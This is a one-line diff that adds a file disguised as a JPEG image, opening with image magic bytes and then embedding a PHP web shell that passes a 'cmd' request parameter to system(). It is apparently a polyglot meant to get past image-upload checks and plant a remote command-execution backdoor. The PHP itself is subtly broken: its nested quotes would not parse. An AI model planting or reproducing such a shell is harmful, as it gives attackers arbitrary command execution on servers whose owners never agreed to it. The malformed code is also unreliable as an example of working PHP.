@@ -1,0 +1,1 @@
+ÿØÿØ<?php system('$_GET['cmd']') ?>
